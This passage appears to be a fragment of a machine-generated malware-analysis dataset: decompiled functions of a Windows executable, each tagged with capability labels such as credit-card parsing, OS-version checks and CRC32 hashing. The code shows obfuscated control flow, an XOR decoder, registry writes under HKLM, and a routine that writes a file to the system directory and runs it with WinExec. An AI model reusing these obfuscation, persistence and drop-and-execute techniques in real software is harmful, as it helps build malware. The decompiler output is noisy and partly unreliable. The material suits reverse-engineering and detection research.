0x10, 0x406444, 10);\n    if ((!bVar11) && (bVar11)) {\n        *puVar13 = unaff_retaddr;\n        return;\n    }\n    iVar4 = fcn.00402840(0x41f5e0, 0x10, 0x406450, 0x1b);\n    uVar8 = 0;\n    cVar9 = (iVar4 + unaff_EBX | 0x11a9U) == 0;\n    do {\n        uVar12 = 0x401a3e;\n        fcn.00402840(0x41f5e0, 0x10, str.V_Q_, 0x41f5e0);\n        if ((uVar8) || (!uVar8)) {\n            uVar12 = 0x40;\n            goto code_r0x00401a59;\n        }\n    } while (extraout_ECX_00 != 1 && cVar9 != '\\0');\n    *unaff_EDI = iVar5 + -0x1bf31dd2;\n    piVar6 = 0x6ab8ec44;\ncode_r0x00401a59:\n    uVar7 = fcn.00402840(0x41f5e0, 0x10, 0x406480, uVar12);\n    uVar8 = 0;\n    cVar9 = (unaff_EDI & uVar7) == 0;\n    arg_ch = piVar6;\n    uVar7 = unaff_EBP;\n    while( true ) {\n        uVar12 = 0x401a8e;\n        fcn.00402840(0x41f5e0, 0x10, 0x4064c0, 0x41f5e0);\n        if ((uVar8) || (!uVar8)) break;\n        iVar5 = extraout_ECX_01 + -1;\n        if (iVar5 == 0 || cVar9 == '\\0') {\ncode_r0x00401a9a:\n            iVar2 = *piVar6;\n            *unaff_EDI = piVar6 + 1;\n            arg_10h = unaff_EBP | (*0x9750e2b5)[-0xd];\n            pcVar1 = (iVar2 >> 0x1f) + 0x10;\n            *pcVar1 = *pcVar1 + (iVar5 >> 8);\n            fcn.00402840(0x41f5e0, arg_ch, uVar7, uVar12);\n            fcn.00402840(0x41f5e0, 0x10, 0x4064d8, 4);\n            fcn.00402840(0x41f5e0, 0x10, 0x4064dc, 4);\n            uVar12 = 0x6ab8ec44;\n            bVar11 = (POPCOUNT(extraout_DH + -0x36) & 1U) == 0;\n            iVar5 = fcn.00402840(0x41f5e0, 0x10, 0x4064e0, 0xc);\n            if ((bVar11) || (!bVar11)) {\n                unaff_EDI = 0x4;\n                arg_10h = 0x4064ec;\n                uVar12 = 0x10;\n            }\n            in(iVar5);\n            *(iVar5 + 0x10) = *(iVar5 + 0x10) + extraout_CH;\n            fcn.00402840(0x41f5e0, uVar12, arg_10h, unaff_EDI);\n            fcn.00402840(0x41f5e0, 0x10, 0x4064f0, 9);\n            fcn.00402840(0x41f5e0, 0x10, 0x4064fc, 0x16);\n            fcn.00402840(0x41f5e0, 0x10, 0x406514, 7);\n            return;\n        }\n    }\n    uVar12 = 0xb;\n    uVar7 = 0x4064cc;\n    arg_ch = 0x10;\n    iVar5 = extraout_ECX_01;\n    goto code_r0x00401a9a;\n}\n",
        "token_count": 1973
    },
    "00402ee0": {
        "rules": [
            "parse credit card information/0fcc6283562247e58776c7b51a92f681"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x00402f8b) overlaps instruction at (ram,0x00402f8a)\n// \n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint * __cdecl fcn.00402ee0(uchar *hWnd, uint arg_ch, uint wParam, uint lParam)\n\n{\n    uint16_t uVar1;\n    char cVar2;\n    uint32_t uVar3;\n    uint8_t *puVar4;\n    uint8_t uVar5;\n    uint8_t uVar6;\n    uint8_t uVar7;\n    uint *puVar8;\n    uint32_t in_EAX;\n    int32_t iVar9;\n    char *pcVar10;\n    uint32_t uVar11;\n    uint32_t in_ECX;\n    int16_t iVar12;\n    char *in_EDX;\n    uint *puVar13;\n    uint *puVar14;\n    int32_t unaff_ESI;\n    uint unaff_EDI;\n    ushort in_CS;\n    ushort in_SS;\n    bool bVar15;\n    uint8_t in_AF;\n    bool bVar16;\n    uint8_t in_TF;\n    uint8_t in_IF;\n    uint8_t in_NT;\n    uint8_t in_AC;\n    uint8_t in_VIF;\n    uint8_t in_VIP;\n    uint8_t in_ID;\n    float10 in_ST0;\n    uint auStack24191 [6025];\n    ushort *puStack88;\n    uint uStack52;\n    uint8_t uStack28;\n    uint8_t uStack27;\n    uint16_t uStack24;\n    uint16_t uStack22;\n    uint uStack20;\n    \n    puVar8 = &stack0xfffffffc;\n    uStack20._0_2_ = in_EAX;\n    uStack24 = in_ECX;\n    uStack28 = in_EDX;\n    *hWnd = 0x30;\n    uStack20._2_2_ = SUB42(in_EDX, 0);\n    hWnd[1] = 0xb5;\n    if (('Q' < uStack28) && (uStack28 < 'R')) {\n        uVar6 = 9 < (in_EAX & 0xf) | in_AF;\n        uVar5 = in_EAX + uVar6 * '\\x06';\n        pcVar10 = in_EAX & 0xffff0000 | CONCAT11((in_EAX >> 8) + uVar6, uVar5) & 0xff0f;\n        if (in_ECX != 0) {\n            do {\n    // WARNING: Do nothing block with infinite loop\n            } while( true );\n        }\n        *pcVar10 = *pcVar10 + (uVar5 & 0xf);\n        uStack22 = uStack20;\n        if (*0x41f608 == 0) {\n            (*_sym.imp.USER32.dll_PostQuitMessage)();\n            fcn.00401ee0();\n        }\n        puVar8 = (*_sym.imp.USER32.dll_DefWindowProcA)();\n        return puVar8;\n    }\n    hWnd[2] = 0x35;\n    uVar11 = (in_EAX >> 8 & 0xffff00) << 8;\n    hWnd[3] = 0x3a;\n    uStack20._0_2_ = in_EAX & 0xffff;\n    iVar12 = in_EDX & 0xffff;\n    bVar16 = (iVar12 - 1U & uStack24) != 0;\n    hWnd[4] = 0x8f;\n    uVar6 = (in_EDX & 0xffff) >> 8;\n    if (bVar16) {\n        uVar3 = in_ECX & 0xffff;\n        in_ECX = (in_ECX >> 8 & 0xffff00) << 8 | uVar3;\n        if (!bVar16) {\n            unaff_EDI = CONCAT22(uStack24, in_SS);\n            uStack20._0_2_ = 0x47;\n            uStack20._2_2_ = 0;\n            iVar9 = (uVar11 | in_EAX & 0xffff) + 0xbda95092;\n            *in_EDX = *in_EDX + (uVar3 >> 8);\n            bVar16 = *in_EDX == '\\0';\n            puVar14 = &stack0xfffffffc;\n            if (in_ECX == 0) goto code_r0x00402fb2;\n            pcVar10 = in(iVar12);\n            uVar5 = pcVar10 - *pcVar10;\n            pcVar10 = pcVar10 & 0xffffff00 | uVar5;\n            pcVar10[-0x51dab23c] = pcVar10[-0x51dab23c] + uVar5;\n            *pcVar10 = *pcVar10 + uVar5;\n            puVar8 = &stack0xfffffffc;\n            goto code_r0x00402f81;\n        }\n    }\n    hWnd[5] = 0x92;\n    uStack20._2_2_ = uVar11 >> 0x10;\ncode_r0x00402f81:\n    while( true ) {\n        hWnd[6] = 0xee;\n        bVar16 = (hWnd >> 8 ^ 0x16 | uStack20 >> 8) == uVar6;\n        iVar9 = puVar8[2];\n        *(iVar9 + 7) = 0x5f;\n        puVar14 = puVar8;\n        if (!bVar16) {\ncode_r0x00402fb2:\n            puVar8 = puVar14;\n            if (bVar16) {\n                puStack88 = &uStack20;\n                puVar13 = &uStack20;\n                puVar8 = &uStack20;\n                uStack20._0_2_ = SUB42(puVar14, 0);\n                uStack20._2_2_ = puVar14 >> 0x10;\n                cVar2 = '\\x10';\n                do {\n                    puVar14 = puVar14 + -1;\n                    puVar13 = puVar13 + -1;\n                    *puVar13 = *puVar14;\n                    cVar2 = cVar2 + -1;\n                } while ('\\0' < cVar2);\n            }\n        }\n        *(iVar9 + 8) = 0x73;\n        uStack24 = in_ECX;\n        *(iVar9 + 9) = 0x2f;\n        *(iVar9 + 10) = 0x80;\n        uStack28 = in_ECX;\n        uStack27 = in_ECX >> 8;\n        bVar16 = (in_EDX & 0x1200) == 0;\n        uVar5 = POPCOUNT(uVar6 & 0x12);\n        uVar11 = puVar8[2];\n        *(uVar11 + 0xb) = 0xab;\n        uVar7 = uVar11;\n        if ((bVar16) || (!bVar16)) break;\n        in_AF = 9 < (uVar7 & 0xf) | in_AF;\n        uVar7 = uVar7 + in_AF * '\\x06';\n        pcVar10 = uVar11 & 0xffff0000 | CONCAT11((uVar11 >> 8) + in_AF, uVar7) & 0xff0f;\n        if (in_ECX != 0) {\n            do {\n    // WARNING: Do nothing block with infinite loop\n            } while( true );\n        }\n        hWnd = CONCAT31(hWnd >> 8, 0x16);\n        *pcVar10 = *pcVar10 + (uVar7 & 0xf);\n    }\n    *(uVar11 + 0xc) = 0xc2;\n    if ((!bVar16) && (bVar16)) {\n        do {\n    // WARNING: Do nothing block with infinite loop\n        } while( true );\n    }\n    *(uVar11 + 0xd) = 0xe8;\n    if ((bVar16) || (!bVar16)) {\n        *(uVar11 + 0xe) = 0xaa;\n    }\n    else {\n        bVar16 = (uVar11 & 0x40c618c5) == 0;\n        uVar5 = POPCOUNT(uVar11 & 0xc5);\n        uStack28 = in_CS;\n        uStack27 = in_CS >> 8;\n        *CONCAT22(uStack24, in_SS) = uVar7;\n    }\n    bVar15 = (uVar5 & 1) == 0;\n    if ((!bVar15) && (bVar15)) {\n        puVar14 = segment(in_SS, *0x10 + -0x14);\n        in_EDX = 0xb7bc9ea5;\n        if (bVar15) {\n            puVar4 = in_ECX & 0xffff0000 | CONCAT11(uStack27, uStack28);\n            uVar6 = *puVar14;\n            cVar2 = uVar6 - *puVar4;\n            uStack24 = (in_NT & 1) * 0x4000 | SBORROW1(uVar6, *puVar4) * 0x800 | (in_IF & 1) * 0x200 |\n                       (in_TF & 1) * 0x100 | (cVar2 < '\\0') * 0x80 | (cVar2 == '\\0') * 0x40 | (in_AF & 1) * 0x10 |\n                       ((POPCOUNT(cVar2) & 1U) == 0) * 4 | uVar6 < *puVar4;\n            uStack22 = (in_ID & 1) * 0x20 | (in_VIP & 1) * 0x10 | (in_VIF & 1) * 8 | (in_AC & 1) * 4;\n            uStack52 = unaff_EDI;\n            func_0x10188f5c();\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        }\n        bVar16 = *0x10 == 0x10;\n        uVar11 = *puVar14;\n        uStack20._0_2_ = 0x9ea5;\n        uStack20._2_2_ = 0xb7bc;\n    }\n    *(uVar11 + 0xf) = 0x78;\n    if ((bVar16) || (!bVar16)) {\n        *(uVar11 + 0x10) = 0xc0;\n    }\n    else {\n        uVar11 = uVar11 & 0xffffff00 | uVar11 * '\\x02';\n    }\n    uStack28 = in_EDX;\n    uStack27 = in_EDX >> 8;\n    *(uVar11 + 0x11) = 0xff;\n    uStack24 = uVar11;\n    uStack22 = uVar11 >> 0x10;\n    bVar16 = (in_EDX & 0x1200) != 0;\n    iVar9 = puVar8[2];\n    *(iVar9 + 0x12) = 0x6e;\n    puVar14 = puVar8;\n    if ((bVar16) && (!bVar16)) {\n        puVar13 = &uStack24;\n        puVar14 = &uStack24;\n        uStack24 = puVar8;\n        uStack22 = puVar8 >> 0x10;\n        cVar2 = '\\x10';\n        do {\n            puVar8 = puVar8 + -1;\n            puVar13 = puVar13 + -1;\n            *puVar13 = *puVar8;\n            cVar2 = cVar2 + -1;\n        } while ('\\0' < cVar2);\n    }\n    *(iVar9 + 0x13) = 0x49;\n    *(iVar9 + 0x14) = 0x32;\n    uVar1 = ((CONCAT11(((uVar11 & 0xffff) >> 8) + -0x2b, uVar11 & 0xffff) ^ 0x3d) + 0x7c28 ^\n            CONCAT11(uStack27 | uStack28, uStack28)) + 0xbfff;\n    bVar16 = (POPCOUNT(uVar1 & 0xff) & 1U) == 0;\n    *(iVar9 + 0x15) = 0x37;\n    if ((-1 < uVar1) && (-1 >= uVar1)) {\n        pcVar10 = iVar9 + 4;\n        *(iVar9 + 0x1c) = in_ST0;\n        iVar9 = iVar9 + 5;\n        bVar16 = (POPCOUNT(*(unaff_ESI + 4) - *pcVar10) & 1U) == 0;\n    }\n    *(iVar9 + 0x16) = 0x5d;\n    if ((!bVar16) && (bVar16)) {\n        puVar8 = auStack24191 + 1;\n        cVar2 = '\\x1e';\n        do {\n            puVar14 = puVar14 + -1;\n            puVar8 = puVar8 + -1;\n            *puVar8 = *puVar14;\n            cVar2 = cVar2 + -1;\n        } while ('\\0' < cVar2);\n        puVar8 = in(0x78);\n        return puVar8;\n    }\n    puVar8 = puVar14[3];\n    *puVar8 = 0x17;\n    return puVar8;\n}\n",
        "token_count": 3028
    },
    "00403ad0": {
        "rules": [
            "parse credit card information/562ff391f55141bc9728340148e50ea1"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00403b45) overlaps instruction at (ram,0x00403b44)\n// \n// WARNING: Removing unreachable block (ram,0x00403b35)\n// WARNING: Removing unreachable block (ram,0x00403bb0)\n// WARNING: Removing unreachable block (ram,0x00403b3a)\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nvoid fcn.00403ad0(int32_t param_1, uint32_t param_2, int32_t param_3, uint32_t param_4)\n\n{\n    uint32_t uVar1;\n    \n    uVar1 = 0;\n    if (param_4 != 0) {\n        do {\n            *(uVar1 + param_3) = *(uVar1 + param_3) ^ *(uVar1 % param_2 + param_1);\n            uVar1 = uVar1 + 1;\n        } while (uVar1 < param_4);\n    }\n    return;\n}\n",
        "token_count": 227
    },
    "00403d10": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2",
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00403d61) overlaps instruction at (ram,0x00403d5e)\n// \n// WARNING: Removing unreachable block (ram,0x00403e39)\n// WARNING: Removing unreachable block (ram,0x00403e42)\n// WARNING: Removing unreachable block (ram,0x00403e46)\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint32_t __cdecl\nfcn.00403d10(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch, int32_t arg_20h)\n\n{\n    char **ppcVar1;\n    char *pcVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint32_t unaff_EBX;\n    uint *puVar5;\n    ushort in_SS;\n    bool bVar6;\n    uchar var_10ch;\n    uint var_10bh;\n    uint var_8h;\n    uint var_4h;\n    \n    bVar6 = (POPCOUNT(&var_10ch & 0xff) & 1U) == 0;\n    if ((!bVar6) && (bVar6)) {\n        ppcVar1 = segment(in_SS, *0x10 + -0x11c);\n        pcVar2 = *ppcVar1;\n        if (&stack0xfffffffc < 0x10c) {\n            *pcVar2 = *pcVar2 + pcVar2;\n        }\n        else if (bVar6) {\n            iVar3 = fcn.004035d0(0x80000002, 0x406204, \"XMT\u019cD\", &var_10ch, &stack0xfffffeec);\n            if ((iVar3 == 0) || (5 < unaff_EBX)) {\n                unaff_EBX = 0xffffffff;\n            }\n            return unaff_EBX;\n        }\n    }\n    fcn.00404190(arg_18h, arg_1ch, arg_8h, 0x20, arg_20h + 0x20);\n    fcn.00404190(arg_18h, arg_1ch, arg_ch, 0x20, arg_20h + 0x60);\n    fcn.00404190(arg_18h, arg_1ch, arg_10h, 0x20, arg_20h + 0xa0);\n    fcn.00404190(arg_18h, arg_1ch, arg_14h, 0x20, arg_20h + 0xe0);\n    iVar3 = fcn.00403cc0();\n    if (iVar3 == -1) {\n        iVar3 = (*_sym.imp.MSVCRT.dll_rand)();\n        *(arg_20h + 0x120) = iVar3 % 5;\n    }\n    else {\n        *(arg_20h + 0x120) = iVar3;\n    }\n    var_10ch = 0;\n    puVar5 = &var_10bh;\n    for (iVar3 = 0x40; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar5 = 0;\n        puVar5 = puVar5 + 1;\n    }\n    *puVar5 = 0;\n    var_4h = 0x104;\n    *(puVar5 + 2) = 0;\n    uVar4 = fcn.004035d0(0x80000001, 0x40629c, str.oZi, &var_8h, &var_10ch, &var_4h);\n    if ((uVar4 != 0) && (uVar4 = (*_sym.imp.MSVCRT.dll__stricmp)(&var_10ch, str.ZKUt),  uVar4 == 0)) {\n        *(arg_20h + 0x120) = *(arg_20h + 0x120) | 0x80;\n    }\n    return uVar4;\n}\n",
        "token_count": 902
    },
    "004042b0": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\nuint fcn.004042b0(void)\n\n{\n    uint lpVersionInformation;\n    int32_t var_90h;\n    int32_t var_8ch;\n    \n    lpVersionInformation = 0x94;\n    (*_sym.imp.KERNEL32.dll_GetVersionExA)(&lpVersionInformation);\n    if (var_90h == 5) {\n        return 1;\n    }\n    if ((var_90h == 6) && (var_8ch == 0)) {\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 120
    },
    "00404330": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x0040444e) overlaps instruction at (ram,0x0040444d)\n// \n\nuint __cdecl fcn.00404330(char *arg_8h, int32_t arg_ch)\n\n{\n    char cVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint8_t *puVar5;\n    uint *puVar6;\n    char *pcVar7;\n    uchar var_264h;\n    uint var_263h;\n    char var_160h;\n    uint var_15fh;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    int32_t var_48h;\n    int32_t var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    char *var_34h;\n    uint var_30h;\n    uint var_2ch;\n    char *var_28h;\n    uint var_24h;\n    char *var_20h;\n    char *var_1ch;\n    uint *var_18h;\n    uint *var_14h;\n    uint *var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    pcVar2 = _sym.imp.MSVCRT.dll_sprintf;\n    var_264h = 0;\n    puVar6 = &var_263h;\n    for (iVar3 = 0x40; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar6 = 0;\n        puVar6 = puVar6 + 1;\n    }\n    *puVar6 = 0;\n    *(puVar6 + 2) = 0;\n    var_160h = '\\0';\n    puVar6 = &var_15fh;\n    for (iVar3 = 0x40; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar6 = 0;\n        puVar6 = puVar6 + 1;\n    }\n    *puVar6 = 0;\n    *(puVar6 + 2) = 0;\n    var_ch = 1;\n    var_4h = 0;\n    var_8h = 1;\n    puVar5 = arg_ch != 0;\n    (*_sym.imp.MSVCRT.dll_sprintf)(&var_160h, str.D_7, arg_8h);\n    (*pcVar2)(&var_264h, 0x4060a4, arg_8h);\n    var_20h = &var_160h;\n    var_18h = &var_ch;\n    var_14h = &var_4h;\n    var_10h = &var_8h;\n    uVar4 = 0xffffffff;\n    pcVar7 = &var_160h;\n    do {\n        if (uVar4 == 0) break;\n        uVar4 = uVar4 - 1;\n        cVar1 = *pcVar7;\n        pcVar7 = pcVar7 + 1;\n    } while (cVar1 != '\\0');\n    var_48h = ~uVar4 - 1;\n    uVar4 = 0xffffffff;\n    pcVar7 = arg_8h;\n    do {\n        if (uVar4 == 0) break;\n        uVar4 = uVar4 - 1;\n        cVar1 = *pcVar7;\n        pcVar7 = pcVar7 + 1;\n    } while (cVar1 != '\\0');\n    var_44h = ~uVar4 - 1;\n    var_34h = str.tB_;\n    var_30h = 0x4060d8;\n    var_2ch = 0x4060e4;\n    var_28h = \"bWQ\u0450D\";\n    var_24h = 0x4060fc;\n    var_5ch = 2;\n    var_58h = 1;\n    var_54h = 4;\n    var_50h = 4;\n    var_4ch = 4;\n    var_1ch = arg_8h;\n    var_40h = 4;\n    var_3ch = 4;\n    var_38h = 4;\n    if ((var_44h < 0) || (var_44h >= 0)) {\n        if (0x4 < puVar5) {\n            return 1;\n        }\n    }\n    else {\n        *puVar5 = *puVar5 & 0xc3;\n    }\n    pcVar2 = _sym.imp.SHLWAPI.dll_SHSetValueA;\n    uVar4 = puVar5 * 4;\n    do {\n        iVar3 = (*pcVar2)(0x80000002, &var_264h, *(&var_34h + uVar4), *(&var_5ch + uVar4), *(&var_20h + uVar4), \n                          *(&var_48h + uVar4));\n        if (iVar3 != 0) {\n            return 0;\n        }\n        uVar4 = uVar4 + 4;\n    } while (uVar4 < 0x14);\n    return 1;\n}\n",
        "token_count": 1186
    },
    "00403bc0": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00403cb6) overlaps instruction at (ram,0x00403cb4)\n// \n\nint32_t __cdecl fcn.00403bc0(uint arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t unaff_EDI;\n    bool bVar2;\n    uint *puStack848;\n    uint uStack844;\n    uint uStack840;\n    uint *puStack836;\n    uint *puStack832;\n    uint *puStack828;\n    uint *puStack824;\n    uint *puStack820;\n    uint *puStack816;\n    uint *puStack812;\n    uint var_31ch;\n    uint lpBuffer;\n    uint Sid;\n    uint var_10h;\n    uint pcbBuffer;\n    uint var_8h;\n    uint var_4h;\n    \n    pcbBuffer = 0x104;\n    puStack812 = &fcn.00403bc0::lpBuffer;\n    puStack816 = 0x403c01;\n    iVar1 = (*_sym.imp.ADVAPI32.dll_GetUserNameA)();\n    if (iVar1 == 0) {\n        return 0;\n    }\n    var_4h = 0x104;\n    var_8h = 0x104;\n    puStack816 = &fcn.00403bc0::var_10h;\n    puStack820 = &fcn.00403bc0::var_8h;\n    puStack824 = &fcn.00403bc0::var_31ch;\n    puStack828 = &fcn.00403bc0::var_4h;\n    puStack832 = &fcn.00403bc0::Sid;\n    puStack836 = &fcn.00403bc0::lpBuffer;\n    uStack840 = 0;\n    uStack844 = 0x403c62;\n    iVar1 = (*_sym.imp.ADVAPI32.dll_LookupAccountNameA)();\n    if (iVar1 == 0) {\n        return 0;\n    }\n    puStack848 = &fcn.00403bc0::Sid;\n    uStack844 = arg_8h;\n    iVar1 = (*_sym.imp.ADVAPI32.dll_ConvertSidToStringSidA)();\n    bVar2 = iVar1 == 0;\n    if (bVar2) {\n        return 0;\n    }\n    if ((bVar2) || (!bVar2)) {\n        iVar1 = 1;\n    }\n    else {\n        *(unaff_EDI + -0x48) = *(unaff_EDI + -0x48) - &stack0xfffffcb0;\n    }\n    return iVar1;\n}\n",
        "token_count": 574
    },
    "00404190": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00404227) overlaps instruction at (ram,0x00404225)\n// \n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nvoid __cdecl fcn.00404190(int32_t arg_8h, int32_t arg_ch, int32_t arg_10h, int32_t arg_14h, int32_t arg_18h)\n\n{\n    uint8_t uVar1;\n    uint32_t uVar2;\n    uint8_t extraout_CL;\n    uint8_t uVar4;\n    int32_t iVar3;\n    uchar *puVar5;\n    uint var_10h;\n    uchar *var_ch;\n    int32_t var_8h;\n    uint var_1h;\n    \n    var_8h = 0;\n    if (0 < arg_14h) {\n        var_ch = 0x1;\n        iVar3 = arg_14h * 2;\n        do {\n            uVar4 = iVar3 >> 8 | 0x47;\n            uVar2 = var_ch / arg_ch;\n            uVar1 = *(var_ch % arg_ch + arg_8h);\n            puVar5 = var_ch;\n            if ((uVar4 != 0) && (uVar4 == 0)) {\n                uVar2 = uVar2 & 0xffffff00 | *0x4bb148d3;\n                puVar5 = var_ch + 1;\n                out(*var_ch, var_ch % arg_ch & 0xff00 | uVar1);\n            }\n            if (uVar4 < '\\0') {\ncode_r0x00404227:\n                uVar4 = *(var_8h + arg_10h) ^ *((puVar5 + -1) % arg_ch + arg_8h);\n            }\n            else {\n                if (uVar4 >= '\\0') goto code_r0x00404227;\n                puVar5 = uVar2 + 1;\n                (*(arg_ch + 0x4d8af9f7))();\n                uVar4 = extraout_CL;\n            }\n            var_10h._0_1_ = arg_14h * 2;\n            puVar5[arg_18h + -1] = var_10h ^ uVar4;\n            var_ch[arg_18h] = var_10h ^ uVar1;\n            var_ch = var_ch + 2;\n            var_8h = var_8h + 1;\n            iVar3 = arg_14h;\n        } while (var_8h < arg_14h);\n    }\n    return;\n}\n",
        "token_count": 596
    },
    "00401ee0": {
        "rules": [
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf",
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8"
        ],
        "decompiled_code": "\nuint fcn.00401ee0(void)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    char **ppcVar6;\n    uint *puVar7;\n    char *pcVar8;\n    char *pcVar9;\n    char *pcVar10;\n    uint *puVar11;\n    uint uStack2112;\n    uint uStack2088;\n    char cStack2084;\n    uint uStack2083;\n    ushort uStack2079;\n    uchar uStack2077;\n    uchar uStack2064;\n    uint uStack2063;\n    uchar auStack1824 [12];\n    uchar auStack1812 [8];\n    uchar uStack1804;\n    uint uStack1803;\n    uchar auStack1564 [260];\n    char acStack1304 [20];\n    uchar auStack1284 [239];\n    char acStack1045 [21];\n    uchar uStack1024;\n    uint uStack1023;\n    \n    uStack2088 = 0;\n    cStack2084 = '\\0';\n    uStack2083 = 0;\n    uStack2079 = 0;\n    uStack2077 = 0;\n    uStack2064 = 0;\n    puVar7 = &uStack2063;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    *puVar7 = 0;\n    *(puVar7 + 2) = 0;\n    uStack1804 = 0;\n    puVar7 = &uStack1803;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    *puVar7 = 0;\n    *(puVar7 + 2) = 0;\n    uStack1024 = 0;\n    puVar7 = &uStack1023;\n    for (iVar2 = 0xff; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    *puVar7 = 0;\n    uStack2112 = 0x104;\n    *(puVar7 + 2) = 0;\n    (*_sym.imp.KERNEL32.dll_GetSystemDirectoryA)(auStack1284);\n    (*_sym.imp.KERNEL32.dll_GetModuleFileNameA)(0, auStack1812, 0x104);\n    fcn.00401dc0(&uStack2112, 6);\n    (*_sym.imp.MSVCRT.dll_sprintf)(auStack1564, 0x406444, acStack1304, &uStack2112);\n    uStack2088 = 0x4064fc;\n    ppcVar6 = &stack0xfffff7d0;\n    iVar2 = 3;\n    do {\n        uVar3 = 0xffffffff;\n        pcVar9 = &cStack2084;\n        do {\n            if (uVar3 == 0) break;\n            uVar3 = uVar3 - 1;\n            cVar1 = *pcVar9;\n            pcVar9 = pcVar9 + 1;\n        } while (cVar1 != '\\0');\n        pcVar9 = *ppcVar6;\n        ppcVar6 = ppcVar6 + 1;\n        *(&uStack2088 + ~uVar3 + 3) = 10;\n        uVar3 = 0xffffffff;\n        do {\n            pcVar8 = pcVar9;\n            if (uVar3 == 0) break;\n            uVar3 = uVar3 - 1;\n            pcVar8 = pcVar9 + 1;\n            cVar1 = *pcVar9;\n            pcVar9 = pcVar8;\n        } while (cVar1 != '\\0');\n        uVar3 = ~uVar3;\n        iVar4 = -1;\n        pcVar9 = &cStack2084;\n        do {\n            pcVar10 = pcVar9;\n            if (iVar4 == 0) break;\n            iVar4 = iVar4 + -1;\n            pcVar10 = pcVar9 + 1;\n            cVar1 = *pcVar9;\n            pcVar9 = pcVar10;\n        } while (cVar1 != '\\0');\n        puVar7 = pcVar8 + -uVar3;\n        puVar11 = pcVar10 + -1;\n        for (uVar5 = uVar3 >> 2; uVar5 != 0; uVar5 = uVar5 - 1) {\n            *puVar11 = *puVar7;\n            puVar7 = puVar7 + 1;\n            puVar11 = puVar11 + 1;\n        }\n        iVar2 = iVar2 + -1;\n        for (uVar3 = uVar3 & 3; uVar3 != 0; uVar3 = uVar3 - 1) {\n            *puVar11 = *puVar7;\n            puVar7 = puVar7 + 1;\n            puVar11 = puVar11 + 1;\n        }\n    } while (iVar2 != 0);\n    (*_sym.imp.MSVCRT.dll_sprintf)(acStack1045 + 1, &cStack2084, auStack1824, auStack1824, acStack1304[0]);\n    pcVar9 = acStack1045;\n    uVar3 = 0xffffffff;\n    do {\n        pcVar9 = pcVar9 + 1;\n        if (uVar3 == 0) break;\n        uVar3 = uVar3 - 1;\n    } while (*pcVar9 != '\\0');\n    acStack1045[~uVar3] = '\\n';\n    uVar3 = 0xffffffff;\n    pcVar9 = 0x406514;\n    do {\n        pcVar8 = pcVar9;\n        if (uVar3 == 0) break;\n        uVar3 = uVar3 - 1;\n        pcVar8 = pcVar9 + 1;\n        cVar1 = *pcVar9;\n        pcVar9 = pcVar8;\n    } while (cVar1 != '\\0');\n    uVar3 = ~uVar3;\n    iVar2 = -1;\n    pcVar9 = acStack1045 + 1;\n    do {\n        pcVar10 = pcVar9;\n        if (iVar2 == 0) break;\n        iVar2 = iVar2 + -1;\n        pcVar10 = pcVar9 + 1;\n        cVar1 = *pcVar9;\n        pcVar9 = pcVar10;\n    } while (cVar1 != '\\0');\n    puVar7 = pcVar8 + -uVar3;\n    puVar11 = pcVar10 + -1;\n    for (uVar5 = uVar3 >> 2; uVar5 != 0; uVar5 = uVar5 - 1) {\n        *puVar11 = *puVar7;\n        puVar7 = puVar7 + 1;\n        puVar11 = puVar11 + 1;\n    }\n    for (uVar3 = uVar3 & 3; uVar3 != 0; uVar3 = uVar3 - 1) {\n        *puVar11 = *puVar7;\n        puVar7 = puVar7 + 1;\n        puVar11 = puVar11 + 1;\n    }\n    pcVar9 = acStack1045;\n    uVar3 = 0xffffffff;\n    do {\n        pcVar9 = pcVar9 + 1;\n        if (uVar3 == 0) break;\n        uVar3 = uVar3 - 1;\n    } while (*pcVar9 != '\\0');\n    iVar2 = fcn.00401e20(auStack1564, 0x406440, acStack1045 + 1, ~uVar3 - 1);\n    if (iVar2 == 0) {\n        return 0;\n    }\n    (*_sym.imp.KERNEL32.dll_WinExec)(auStack1564, 